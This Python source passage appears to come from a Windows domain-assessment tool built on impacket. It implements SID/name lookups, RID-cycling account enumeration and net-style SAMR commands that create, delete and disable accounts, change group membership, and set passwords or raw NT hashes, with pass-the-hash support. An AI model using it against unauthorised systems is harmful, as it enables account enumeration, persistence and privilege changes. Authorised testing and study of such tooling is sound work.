#      [MS-LSAD] = Local Security Authority (Domain Policy) Remote Protocol      #
#                             Interface = LSARPC                                 #
##################################################################################

from impacket.dcerpc.v5 import lsat, lsad

class SID_TYPE(Enum):
	LocalUser             = 1
	DomainGroup           = 2
	DomainUser            = 3
	LocalGroup            = 4
	WellKnownGroup        = 5
	DeletedAccount        = 6
	Invalid               = 7
	Unknown               = 8
	Computer              = 9
	Label                 = 10

def SIDToName(ip, user, pwd, domain, nthash, aesKey, ccache, SIDString, unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None):
	###
	# Does not require administrative rights
	###

	print_yellow("[*] Lookup name of SID")
	print_yellow("---")
	print()

	try:
		# Connect to the interface
		if alternateBinding == None:
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\lsarpc]' % ip)
		else:
			rpctransport = transport.DCERPCTransportFactory(alternateBinding)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		if alternateInterface == None:
			dce.bind(UUIDTupToBin(('12345778-1234-ABCD-EF00-0123456789AB','0.0')))
		else:
			dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))

		# Query methods of the interface
		policyHandle = lsad.hLsarOpenPolicy2(dce, lsat.POLICY_LOOKUP_NAMES | lsad.MAXIMUM_ALLOWED)['PolicyHandle']
		try:
			res = lsat.hLsarLookupSids(dce, policyHandle, [SIDString], lsat.LSAP_LOOKUP_LEVEL.enumItems.LsapLookupWksta)
		except Exception as e:
			if str(e).find('STATUS_NONE_MAPPED') >= 0:
				print('[-] SID %s lookup failed, return status: STATUS_NONE_MAPPED' % SIDString)
				return
			else:
				raise e
		domains = []
		for entry in res['ReferencedDomains']['Domains']:
			domains.append(entry['Name'])
		for entry in res['TranslatedNames']['Names']:
				domain = domains[entry['DomainIndex']]
				name = entry['Name']
				accountType = SID_TYPE(entry['Use']).name
				if name != b'':
					login = "%s\\%s" % (domain, name)
				else:
					login = domain
				print(f"[+] {SIDString} = {login} ({accountType})")

		return login
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def NameToSID(ip, user, pwd, domain, nthash, aesKey, ccache, name, unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None):
	###
	# Does not require administrative rights
	###

	print_yellow("[*] Lookup SID of name")
	print_yellow("---")
	print()

	try:
		# Connect to the interface
		if alternateBinding == None:
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\lsarpc]' % ip)
		else:
			rpctransport = transport.DCERPCTransportFactory(alternateBinding)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		if alternateInterface == None:
			dce.bind(UUIDTupToBin(('12345778-1234-ABCD-EF00-0123456789AB','0.0')))
		else:
			dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))

		# Query methods of the interface
		policyHandle = lsad.hLsarOpenPolicy2(dce, lsat.POLICY_LOOKUP_NAMES | lsad.MAXIMUM_ALLOWED)['PolicyHandle']
		try:
			res = lsat.hLsarLookupNames(dce, policyHandle, [name], lsat.LSAP_LOOKUP_LEVEL.enumItems.LsapLookupWksta)
		except Exception as e:
			if str(e).find('STATUS_NONE_MAPPED') >= 0:
				print('[-] Name not found')
				return
			else:
				raise e
		domainSIDs = []
		for entry in res['ReferencedDomains']['Domains']:
			domainSIDs.append(entry['Sid'].formatCanonical())
		for entry in res['TranslatedSids']['Sids']:
			domainSID = domainSIDs[entry['DomainIndex']]
			if entry['RelativeId'] == 4294967295: # Domain
				SIDString = domainSID
			else:
				SIDString = f"{domainSID}-{entry['RelativeId']}"
			print(f"[+] {name} = {SIDString}")

		return SIDString
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def NameToSID2(ip, user, pwd, domain, nthash, aesKey, ccache, name, unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None):
	###
	# Does not require administrative rights
	###

	print_yellow("[*] Lookup SID of name (LsarLookupNames3)")
	print_yellow("---")
	print()	

	try:
		# Connect to the interface
		if alternateBinding == None:
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\lsarpc]' % ip)
		else:
			rpctransport = transport.DCERPCTransportFactory(alternateBinding)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		if alternateInterface == None:
			dce.bind(UUIDTupToBin(('12345778-1234-ABCD-EF00-0123456789AB','0.0')))
		else:
			dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))
		
		# Query methods of the interface
		policyHandle = lsad.hLsarOpenPolicy2(dce)['PolicyHandle']
		try:
			res = lsat.hLsarLookupNames3(dce, policyHandle, [name], lsat.LSAP_LOOKUP_LEVEL.enumItems.LsapLookupWksta)
		except Exception as e:
			if str(e).find('STATUS_NONE_MAPPED') >= 0:
				print('[-] Name not found')
				return
			else:
				raise e
		sid = res['TranslatedSids']['Sids'][0]['Sid']

		return sid
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def ridCycling(ip, user, pwd, domain, nthash, aesKey, ccache, minRID = 500, maxRID = 3000, unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None):
	###
	# Does not require authentication if
	#	- Policy "Network access: Do not allow anonymous enumeration of SAM accounts" disabled (not default)
	###

	print_yellow("[*] Enumerating accounts through RID Cycling")
	print_yellow("---")
	print()	

	try:
		# Connect to the interface
		if alternateBinding == None:
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\lsarpc]' % ip)
		else:
			rpctransport = transport.DCERPCTransportFactory(alternateBinding)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		if alternateInterface == None:
			dce.bind(UUIDTupToBin(('12345778-1234-ABCD-EF00-0123456789AB','0.0')))
		else:
			dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))
		
		# Query methods of the interface

		# Identify Domain SIDs from well-known names
		print("[+] Searching Domain SIDs by resolving well-known names")
		names = ['administrator', 'krbtgt', 'guest', 'none']
		sids = []
		policyHandle = lsad.hLsarOpenPolicy2(dce)['PolicyHandle']
		for name in names:
			try:
				res = lsat.hLsarLookupNames(dce, policyHandle, [name], lsat.LSAP_LOOKUP_LEVEL.enumItems.LsapLookupWksta)
				domainSIDs = []
				for entry in res['ReferencedDomains']['Domains']:
					domainSIDs.append(entry['Sid'].formatCanonical())
				for entry in res['TranslatedSids']['Sids']:
					domainSID = domainSIDs[entry['DomainIndex']]
					if domainSID not in sids:
						sids.append(domainSID)
			except Exception as e:
				if str(e).find('STATUS_NONE_MAPPED') >= 0:
					pass
				else:
					raise e
		
		if sids != []:
			print(f"\t[+] {sids}")
		else:
			print("[-] No Domain SIDs found", file = sys.stderr)
			return
		
		# Enumerating RIDs with Domain SIDs
		print("[+] Enumerating RIDs with Domain SIDs")
		policyHandle = lsad.hLsarOpenPolicy2(dce, lsat.POLICY_LOOKUP_NAMES | lsad.MAXIMUM_ALLOWED)['PolicyHandle']
		for sid in sids:
			for rid in range(int(minRID), int(maxRID)+1):
				toResolve = f'{sid}-{rid}'
				try:
					res = lsat.hLsarLookupSids(dce, policyHandle, [toResolve], lsat.LSAP_LOOKUP_LEVEL.enumItems.LsapLookupWksta)
					domains = []
					for entry in res['ReferencedDomains']['Domains']:
						domains.append(entry['Name'])
					for entry in res['TranslatedNames']['Names']:
						domain = domains[entry['DomainIndex']]
						name = entry['Name']
						accountType = SID_TYPE(entry['Use']).name
						login = "%s\\%s" % (domain, name)
						print(f"\t[+] {toResolve} = {login} ({accountType})")
				except Exception as e:
					if str(e).find('STATUS_NONE_MAPPED') >= 0:
						pass
					else:
						raise e
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

#####################################################################################
#   [MS-SAMR] = Security Account Manager (SAM) Remote Protocol (Client-to-Server)   #
#                              Interface = SAMR                                     #
#####################################################################################

from impacket.dcerpc.v5 import samr

def extractKeys(cmd):
	# Regular expression to match words within single quotes, double quotes, and words without quotes
	pattern = r"'[^']*'|\"[^\"]*\"|\S+"
	# Find all matches using the pattern
	words = re.findall(pattern, cmd)
	# Remove surrounding quotes from extracted words
	words = [word.strip("'\"") for word in words]

	return words

def openAlias(dce, domainHandle, aliasName):
	aliasRID = samr.hSamrLookupNamesInDomain(dce, domainHandle, [aliasName])['RelativeIds']['Element'][0]['Data']
	aliasHandle = samr.hSamrOpenAlias(dce, domainHandle, aliasId = aliasRID)['AliasHandle']
	return aliasHandle

def openGroup(dce, domainHandle, groupName):
	groupRID = samr.hSamrLookupNamesInDomain(dce, domainHandle, [groupName])['RelativeIds']['Element'][0]['Data']
	groupHandle = samr.hSamrOpenGroup(dce, domainHandle, groupId = groupRID)['GroupHandle']
	return groupHandle

def openUser(dce, domainHandle, userName):
	userRID = samr.hSamrLookupNamesInDomain(dce, domainHandle, [userName])['RelativeIds']['Element'][0]['Data']
	userHandle = samr.hSamrOpenUser(dce, domainHandle, userId = userRID)['UserHandle']
	return userHandle

def openDomain(dce, Builtin = False):
	index = 1 if Builtin else 0
	serverHandle = samr.hSamrConnect(dce)['ServerHandle']
	domainName = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)['Buffer']['Buffer'][index]['Name']
	domainRID = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domainName)['DomainId']
	domainHandle = samr.hSamrOpenDomain(dce, serverHandle, domainId = domainRID)['DomainHandle']
	return domainHandle

def getUnixTime(t):
	t -= 116444736000000000
	t /= 10000000
	return t

def getTimeString(large_integer):
	time = (large_integer['HighPart'] << 32) + large_integer['LowPart']
	if time == 0 or time == 0x7FFFFFFFFFFFFFFF:
			time = 'Never'
	else:
			time = datetime.datetime.fromtimestamp(getUnixTime(time))
			time = time.strftime("%d/%m/%Y %H:%M:%S %p")
	return time

def windowsFileTimeToTimedelta(fileTimeStr):
	fileTime = int(fileTimeStr)
	if fileTime == 0 or fileTime == -0x8000000000000000:
		return 'Never'
	
	seconds = -fileTime / 10_000_000
	return str(datetime.timedelta(seconds = seconds))

def formatLogonHours(s):
	logon_hours = ''.join(map(lambda b: b.hex(), s))
	if logon_hours == ('f' * 42):
			logon_hours = "All"
	return logon_hours

def b2s(b):
	return "Yes" if b else "No"

def displayAccount(account):
	print("\tUser name".ljust(30), account['UserName'])
	print("\tFull name".ljust(30), account['FullName'])
	print("\tComment".ljust(30), account['AdminComment'])
	print("\tUser's comment".ljust(30), account['UserComment'])
	print("\tCountry/region code".ljust(30), "000 (System Default)" if account['CountryCode'] == 0 else account['CountryCode'])
	print("\tAccount active".ljust(30), b2s(account['UserAccountControl'] & samr.USER_ACCOUNT_DISABLED == 0))
	print("\tAccount expires".ljust(30), getTimeString(account['AccountExpires']))
	print('')
	print("\tPassword last set".ljust(30), getTimeString(account['PasswordLastSet']))
	print("\tPassword expires".ljust(30), getTimeString(account['PasswordMustChange']))
	print("\tPassword changeable".ljust(30), getTimeString(account['PasswordCanChange']))
	print("\tPassword required".ljust(30), b2s(account['WhichFields'] & samr.USER_PASSWORD_NOT_REQUIRED == samr.USER_PASSWORD_NOT_REQUIRED))
	print("\tUser may change password".ljust(30), b2s(account['WhichFields'] & samr.UF_PASSWD_CANT_CHANGE == samr.UF_PASSWD_CANT_CHANGE))
	print('')
	print("\tWorkstations allowed".ljust(30), "All" if not account['WorkStations'] else account['WorkStations'])
	print("\tLogon script".ljust(30), account['ScriptPath'])
	print("\tUser profile".ljust(30), account['ProfilePath'])
	print("\tHome directory".ljust(30), account['HomeDirectory'])
	print("\tLast logon".ljust(30), getTimeString(account['LastLogon']))
	print("\tLogon count".ljust(30), account['LogonCount'])
	print('')
	print("\tLogon hours allowed".ljust(30), formatLogonHours(account['LogonHours']['LogonHours']))
	print('')
	print("\tLocal Group Memberships")
	for group in account['LocalGroups']:
			print("\t\t* {}".format(group))
	print('')
	print("\tGlobal Group memberships")
	for group in account['GlobalGroups']:
			print("\t\t* {}".format(group))

def samrCMD(ip, user, pwd, domain, nthash, aesKey, ccache, samrCMD, unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None):
	###
	# Require administrative rights for Windows 10, version 1607 (or later) non-domain controller
	# Does not require administrative rights for others
	# https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/network-access-restrict-clients-allowed-to-make-remote-sam-calls
	###

	print_yellow("[*] Querying SAMR interface")
	print_yellow("---")
	print()	
 
	try:
		# Connect to the interface
		if alternateBinding == None:
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\samr]' % ip)
		else:
			rpctransport = transport.DCERPCTransportFactory(alternateBinding)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		if alternateInterface == None:
			dce.bind(UUIDTupToBin(('12345778-1234-ABCD-EF00-0123456789AC', '1.0')))
		else:
			dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))

		# Query methods of the interface
		keys = extractKeys(samrCMD)
		ACTION = keys[1]
		if ACTION == "user":
			queryAccounts(dce, ip, "User", keys[2:])
		elif ACTION == "computer":
			queryAccounts(dce, ip, "Computer", keys[2:])
		elif ACTION == "group":
			queryGroups(dce, ip, user, pwd, domain, nthash, aesKey, ccache, "Group", keys[2:])
		elif ACTION == "localgroup":
			queryGroups(dce, ip, user, pwd, domain, nthash, aesKey, ccache, "Aliases", keys[2:])
		elif ACTION == "accounts":
			queryDomain(dce)
		else:
			print("[-] Unknown NET action '%s'" % ACTION, file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def queryAccounts(dce, ip, accountType, keys):
	lenKeys = len(keys)
	if (lenKeys == 0):
		# Enumerate all accounts
		print(f"[+] {accountType} accounts for \\\\{ip}")
		domainHandle = openDomain(dce)
		if accountType == "User":
			res = samr.hSamrEnumerateUsersInDomain(dce, domainHandle, samr.USER_NORMAL_ACCOUNT)
		else:
			res = samr.hSamrEnumerateUsersInDomain(dce, domainHandle, samr.USER_WORKSTATION_TRUST_ACCOUNT | samr.USER_SERVER_TRUST_ACCOUNT)
		for entry in res['Buffer']['Buffer']:
			print(f"\t[+] {entry['Name']} - {entry['RelativeId']}")
	elif (lenKeys == 1):
		# Display an account
		accountName = keys[0]
		print(f"[+] {accountType} account '{accountName}' for \\\\{ip}")
		domainHandle = openDomain(dce)
		accountHandle = openUser(dce, domainHandle, accountName)
		res = samr.hSamrQueryInformationUser2(dce, accountHandle, samr.USER_INFORMATION_CLASS.UserAllInformation)
		account = res['Buffer']['All']
		sidArray = samr.SAMPR_PSID_ARRAY()
		groups = samr.hSamrGetGroupsForUser(dce, accountHandle)['Groups']['Groups']
		groupRIDs = list(map(lambda g: g['RelativeId'], groups))
		for group in groups:
			groupRID = group['RelativeId']
			groupHandle = samr.hSamrOpenGroup(dce, domainHandle, groupId = groupRID)['GroupHandle']
			groupSID = samr.hSamrRidToSid(dce, groupHandle, groupRID)['Sid']
			si = samr.PSAMPR_SID_INFORMATION()
			si['SidPointer'] = groupSID
			sidArray['Sids'].append(si)
		globalGroups = samr.hSamrLookupIdsInDomain(dce, domainHandle, groupRIDs)
		account.fields['GlobalGroups'] = list(map(lambda a: a['Data'], globalGroups['Names']['Element']))
		domainHandle = openDomain(dce, True)
		aliasMembership = samr.hSamrGetAliasMembership(dce, domainHandle, sidArray)
		aliasIDs = list(map(lambda a: a['Data'], aliasMembership['Membership']['Element']))
		localGroups = samr.hSamrLookupIdsInDomain(dce, domainHandle, aliasIDs)
		account.fields['LocalGroups'] = list(map(lambda a: a['Data'], localGroups['Names']['Element']))
		displayAccount(account)
	elif (lenKeys == 2):
		if keys[1] == "/del":
			# Delete an account
			accountName = keys[0]
			print(f"[+] Deleting {accountType.lower()} account '{accountName}'")
			domainHandle = openDomain(dce)
			accountHandle = openUser(dce, domainHandle, accountName)
			samr.hSamrDeleteUser(dce, accountHandle)
			print("[+] Account successfully deleted")
		elif keys[1] == "/active:no":
			# Disable an account
			accountName = keys[0]
			print(f"[+] Disabling {accountType.lower()} account '{accountName}'")
			domainHandle = openDomain(dce)
			accountHandle = openUser(dce, domainHandle, accountName)
			res = samr.hSamrQueryInformationUser2(dce, accountHandle, samr.USER_INFORMATION_CLASS.UserControlInformation)
			uac = res['Buffer']['Control']['UserAccountControl']
			newUAC = uac + 1 if uac % 2 == 0 else uac # USER_ACCOUNT_DISABLED = 0x1 (USER_ACCOUNT Codes)
			buffer = samr.SAMPR_USER_INFO_BUFFER()
			buffer['tag'] = samr.USER_INFORMATION_CLASS.UserControlInformation
			buffer['Control']['UserAccountControl'] = newUAC
			accountRID = samr.hSamrLookupNamesInDomain(dce, domainHandle, [accountName])['RelativeIds']['Element'][0]['Data']
			accountHandle = samr.hSamrOpenUser(dce, domainHandle, userId = accountRID)['UserHandle']
			samr.hSamrSetInformationUser2(dce, accountHandle, buffer)
			print("[+] Account sucessfully disabled")
		elif keys[1] == "/active:yes":
			# Enable an account
			accountName = keys[0]
			print(f"[+] Enabling {accountType.lower()} account '{accountName}'")
			domainHandle = openDomain(dce)
			accountHandle = openUser(dce, domainHandle, accountName)
			res = samr.hSamrQueryInformationUser2(dce, accountHandle, samr.USER_INFORMATION_CLASS.UserControlInformation)
			uac = res['Buffer']['Control']['UserAccountControl']
			newUAC = uac - 1 if uac % 2 == 1 else uac # USER_ACCOUNT_DISABLED = 0x1 (USER_ACCOUNT Codes)
			buffer = samr.SAMPR_USER_INFO_BUFFER()
			buffer['tag'] = samr.USER_INFORMATION_CLASS.UserControlInformation
			buffer['Control']['UserAccountControl'] = newUAC
			accountRID = samr.hSamrLookupNamesInDomain(dce, domainHandle, [accountName])['RelativeIds']['Element'][0]['Data']
			accountHandle = samr.hSamrOpenUser(dce, domainHandle, userId = accountRID)['UserHandle']
			samr.hSamrSetInformationUser2(dce, accountHandle, buffer)
			print("[+] Account sucessfully enabled")
		else:
			print("[-] Invalid cmd: %s" % (" ".join(keys)), file = sys.stderr)
	elif (lenKeys == 3):
		# Create an account
		accountName = keys[0]
		print(f"[+] Creating {accountType.lower()} account '{accountName}'")
		domainHandle = openDomain(dce)
		b64Pwd, NT = keys[1].split(":")
		# New created account will be disabled in most cases
		# And the account will have the USER_FORCE_PASSWORD_CHANGE flag
		# https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/a98d7fbb-1735-4fbf-b41a-ef363c899002
		# Thus, after created the account, set the userAccountControl attribute with SamrSetInformationUser2()
		# userAccountControl managed by USER_ACCOUNT Codes: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/b10cfda1-f24f-441b-8f43-80cb93e786ec
		if accountType == "User":
			samr.hSamrCreateUser2InDomain(dce, domainHandle, accountName, samr.USER_NORMAL_ACCOUNT)
		else:
			samr.hSamrCreateUser2InDomain(dce, domainHandle, accountName, samr.USER_WORKSTATION_TRUST_ACCOUNT)
		try:
			buffer = samr.SAMPR_USER_INFO_BUFFER()
			buffer['tag'] = samr.USER_INFORMATION_CLASS.UserControlInformation
			if accountType == "User":
				buffer['Control']['UserAccountControl'] = samr.USER_NORMAL_ACCOUNT | samr.USER_DONT_EXPIRE_PASSWORD
			else:
				buffer['Control']['UserAccountControl'] = samr.USER_WORKSTATION_TRUST_ACCOUNT | samr.USER_DONT_EXPIRE_PASSWORD
			accountRID = samr.hSamrLookupNamesInDomain(dce, domainHandle, [accountName])['RelativeIds']['Element'][0]['Data']
			accountHandle = samr.hSamrOpenUser(dce, domainHandle, userId = accountRID)['UserHandle']
			samr.hSamrSetNTInternal1(dce, accountHandle, base64.b64decode(b64Pwd).decode(), NT)
			samr.hSamrSetInformationUser2(dce, accountHandle, buffer)
			print("[+] Account sucessfully created")
		except Exception as e:
			if (str(e).find("rpc_s_access_denied") != -1):
				print("[-] Access denied", file = sys.stderr)
			else:
				print(f"[-] Got error: {str(e)}", file = sys.stderr)
			try:
				accountRID = samr.hSamrLookupNamesInDomain(dce, domainHandle, [accountName])['RelativeIds']['Element'][0]['Data']
				accountHandle = samr.hSamrOpenUser(dce, domainHandle, userId = accountRID)['UserHandle']
				samr.hSamrDeleteUser(dce, accountHandle)
			except:
				pass
	elif (lenKeys == 4 or lenKeys == 5):
		# Set user password
		accountName = keys[0]
		print(f"[+] Editing {accountType.lower()} account '{accountName}' password")
		domainHandle = openDomain(dce)
		accountHandle = openUser(dce, domainHandle, accountName)
		b64CurrentPwd, b64NewPwd = keys[1].split(":")
		currentLM, newLM = keys[2].split(":")
		currentNT, newNT = keys[3].split(":")
		# Valid options are:
		#	With new clear-text password (Password policy enforced, Kerberos keys created)
		#		[<B64CurrentPwd>]:<B64NewPwd> : [<CurrentNT>]:
		# 	With new NT hash (Password policy not enforced, no Kerberos keys created)
		#		: : :<NewNT> /injectSAM # Require administrative rights
		#		[<B64CurrentPwd>]: : [<CurrentNT>]:<NewNT>
		if (lenKeys == 5):
			injectSAM = True
		else:
			injectSAM = False
		
		if b64CurrentPwd == '' and currentNT == '':
				print(f"\t[-] Current {accountType.lower()} pwd or NT hash required")
		else:
			if b64NewPwd != '':
				samr.hSamrUnicodeChangePasswordUser2(dce, "\x00", accountName, base64.b64decode(b64CurrentPwd).decode(), base64.b64decode(b64NewPwd).decode(), '', currentNT)
				print("\t[+] Account password successfully edited")
			else:
				if injectSAM: # Require administrative rights. Allow to bypass password history policy
					samr.hSamrSetNTInternal1(dce, accountHandle, '', newNT)
				else:
					samr.hSamrChangePasswordUser(dce, accountHandle, base64.b64decode(b64CurrentPwd).decode(), '', currentNT, newLM, newNT) # User will have to change his pwd at next logon
				print("\t[+] Account password successfully edited")
	else:
		print("[-] Invalid cmd: %s" % (" ".join(keys)), file = sys.stderr)

def queryGroups(dce, ip, user, pwd, domain, nthash, aesKey, ccache, groupType, keys):
	lenKeys = len(keys)
	if (lenKeys == 0):
		# Enumerate all groups
		print(f"[+] {groupType} accounts for \\\\{ip}")
		if groupType == "Group":
			domainHandle = openDomain(dce)
			res = samr.hSamrEnumerateGroupsInDomain(dce, domainHandle)
		else:
			domainHandle = openDomain(dce, True)
			res = samr.hSamrEnumerateAliasesInDomain(dce, domainHandle)
		for entry in res['Buffer']['Buffer']:
			print(f"\t[+] {entry['Name']} - {entry['RelativeId']}")
	elif (lenKeys == 1):
		# Query a group
		groupName = keys[0]
		print(f"[+] Listing members of {groupType.lower()} '{groupName}'")
		if groupType == "Group":
			domainHandle = openDomain(dce)
			groupHandle = openGroup(dce, domainHandle, groupName)
			res = samr.hSamrQueryInformationGroup(dce, groupHandle, samr.GROUP_INFORMATION_CLASS.GroupGeneralInformation)['Buffer']['General']
			groupComment = res['AdminComment']
			print("\tGroup name".ljust(20), groupName)
			print("\tComment".ljust(20), groupComment)
			print("\tMembers")
			membersRIDs = samr.hSamrGetMembersInGroup(dce, groupHandle)
			membersNames = samr.hSamrLookupIdsInDomain(dce, domainHandle, list(map(lambda a: a['Data'], membersRIDs['Members']['Members'])))
			for entry in membersNames['Names']['Element']:
				memberName = entry['Data']
				print("\t".ljust(20), memberName)
		else:
			domainHandle = openDomain(dce, True)
			aliasName = keys[0]
			aliasHandle = openAlias(dce, domainHandle, aliasName)
			res = samr.hSamrQueryInformationAlias(dce, aliasHandle, samr.ALIAS_INFORMATION_CLASS.AliasGeneralInformation)['Buffer']['General']
			aliasComment = res['AdminComment']
			print("\tAlias name".ljust(20), aliasName)
			print("\tComment".ljust(20), aliasComment)
			print("\tMembers")
			res = samr.hSamrGetMembersInAlias(dce, aliasHandle)
			for member in res['Members']['Sids']:
				SIDString = member['SidPointer'].formatCanonical()
				originalSTDOUT = sys.stdout
				sys.stdout = StringIO()
				try:
					memberName = SIDToName(ip, user, pwd, domain, nthash, aesKey, ccache, SIDString) # Use LSARPC interface to resolve SIDs
				except:
					sys.stdout = originalSTDOUT
					raise
				sys.stdout = originalSTDOUT
				print("\t".ljust(20), memberName)
	elif (lenKeys == 2):
		if keys[1] == "/add":
			# Create a group
			groupName = keys[0]
			print(f"[+] Creating {groupType.lower()} '{groupName}'")
			if groupType == "Group":
				domainHandle = openDomain(dce)
				samr.hSamrCreateGroupInDomain(dce, domainHandle, groupName)
			else:
				domainHandle = openDomain(dce, True)
				aliasName = keys[0]
				samr.hSamrCreateAliasInDomain(dce, domainHandle, aliasName)
			print(f"[+] {groupType} successfully created")
		elif keys[1] == "/del":
			# Delete a group
			groupName = keys[0]
			print(f"[+] Deleting {groupType.lower()} '{groupName}'")
			if groupType == "Group":
				domainHandle = openDomain(dce)
				groupHandle = openGroup(dce, domainHandle, groupName)
				samr.hSamrDeleteGroup(dce, groupHandle)
			else:
				domainHandle = openDomain(dce, True)
				aliasName = keys[0]
				aliasHandle = openAlias(dce, domainHandle, aliasName)
				samr.hSamrDeleteAlias(dce, aliasHandle)
			print(f"[+] {groupType} successfully deleted")
		else:
			print("[-] Invalid cmd: %s" % (" ".join(keys)), file = sys.stderr)
	elif (lenKeys == 3):
		if keys[2] == "/add":
			# Add account to group
			groupName = keys[0]
			accountName = keys[1]
			print(f"[+] Adding account '{accountName}' to '{groupName}'")
			if groupType == "Group":
				domainHandle = openDomain(dce)
				groupHandle = openGroup(dce, domainHandle, groupName)
				accountRID = samr.hSamrLookupNamesInDomain(dce, domainHandle, [accountName])['RelativeIds']['Element'][0]['Data']
				samr.hSamrAddMemberToGroup(dce, groupHandle, accountRID, samr.SE_GROUP_ENABLED_BY_DEFAULT)
			else:
				domainHandle = openDomain(dce, True)
				aliasName = keys[0]
				aliasHandle = openAlias(dce, domainHandle, aliasName)
				originalSTDOUT = sys.stdout
				sys.stdout = StringIO()
				try:
					accountSID = NameToSID2(ip, user, pwd, domain, nthash, aesKey, ccache, accountName) # Use LSARPC interface to resolve name
				except:
					sys.stdout = originalSTDOUT
					raise
				sys.stdout = originalSTDOUT
				samr.hSamrAddMemberToAlias(dce, aliasHandle, accountSID)
			print("[+] Account successfully added")
		elif keys[2] == "/del":
			# Remove account from group
			groupName = keys[0]
			accountName = keys[1]
			print(f"[+] Removing account '{accountName}' from '{groupName}'")
			if groupType == "Group":
				domainHandle = openDomain(dce)
				groupHandle = openGroup(dce, domainHandle, groupName)
				accountRID = samr.hSamrLookupNamesInDomain(dce, domainHandle, [accountName])['RelativeIds']['Element'][0]['Data']
				samr.hSamrRemoveMemberFromGroup(dce, groupHandle, accountRID)
			else:
				domainHandle = openDomain(dce, True)
				aliasName = keys[0]
				aliasHandle = openAlias(dce, domainHandle, aliasName)
				originalSTDOUT = sys.stdout
				sys.stdout = StringIO()
				try:
					accountSID = NameToSID2(ip, user, pwd, domain, nthash, aesKey, ccache, accountName) # Use LSARPC interface to resolve name
				except:
					sys.stdout = originalSTDOUT
					raise
				sys.stdout = originalSTDOUT
				samr.hSamrRemoveMemberFromAlias(dce, aliasHandle, accountSID)
			print("[+] Account successfully removed")
		else:
			print("[-] Invalid cmd: %s" % (" ".join(keys)), file = sys.stderr)
	else:
		print("[-] Invalid cmd: %s" % (" ".join(keys)), file = sys.stderr)

def queryDomain(dce):
	# Enumerate domain information
	domainHandle = openDomain(dce)

	'''
	enumdomains: samr.hSamrEnumerateDomainsInSamServer
	querydominfo: samr.hSamrQueryInformationDomain2
	getdompwinfo: samr.hSamrGetDomainPasswordInformation
	getusrdompwinfo: samr.hSamrGetUserDomainPasswordInformation
	'''

